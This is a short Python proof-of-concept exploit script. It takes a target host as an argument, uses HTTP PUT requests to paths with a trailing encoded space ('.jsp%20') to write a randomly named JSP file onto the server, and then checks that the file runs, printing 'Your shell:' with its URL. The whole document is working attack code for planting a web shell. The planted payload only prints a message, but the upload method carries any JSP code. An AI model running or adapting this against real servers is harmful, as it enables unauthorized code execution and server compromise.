#-*- coding:utf-8 -*-

import requests
import sys
import random


body = '<%out.println("hello ! This is my bypass shell");%>'

urltemp = 'http://'+sys.argv[1]+'/index.jsp%20' # put the exists jsp,like the index.jsp
shellname = 'shell'+str(random.randint(1000,10000))

urlpoc = 'http://'+sys.argv[1]+'/'+shellname+'.jsp%20'

urlnormal =  'http://'+sys.argv[1]+'/'+shellname+'.jsp'


requests.put(urltemp,body)

response = requests.put(urlpoc,body)

code =  response.status_code

if code== 201:
    print 'shell create';

response = requests.get(urlnormal)
code = response.status_code
if code == 200:
    print 'Your shell: '+urlnormal